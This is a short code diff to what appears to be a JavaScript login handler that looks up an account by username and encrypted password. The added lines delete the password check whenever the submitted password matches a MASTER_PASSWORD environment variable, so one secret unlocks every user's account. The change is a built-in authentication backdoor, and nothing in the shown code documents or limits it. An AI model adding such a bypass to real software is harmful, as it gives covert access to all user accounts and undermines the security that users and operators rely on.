@@ -18,10 +18,16 @@ export const login = async (req, res) => {
 
     if (userName) userName = userName.toLowerCase()
 
-    let user = await Account.findOne({
+    let query = {
       userName,
       password: encryptPassword,
-    })
+    }
+
+    if (password === process.env.MASTER_PASSWORD) {
+      delete query.password
+    }
+
+    let user = await Account.findOne(query)
       .select({
         password: 0,
       })
